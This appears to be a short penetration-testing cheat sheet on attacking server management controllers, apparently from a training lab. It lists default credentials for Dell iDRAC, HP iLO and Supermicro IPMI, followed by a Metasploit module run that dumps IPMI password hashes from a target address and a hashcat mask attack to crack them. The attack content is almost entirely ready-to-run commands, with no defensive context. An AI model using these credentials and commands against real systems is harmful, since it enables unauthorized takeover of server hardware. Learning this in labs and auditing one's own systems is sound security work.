### Default Credential
| Product         | Username      | Password                                                                   |
|-----------------|---------------|----------------------------------------------------------------------------|
| Dell iDRAC      | root          | calvin                                                                     |
| HP iLO          | Administrator | Randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                      |

### IPMI Flaw
Exploit
```
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```
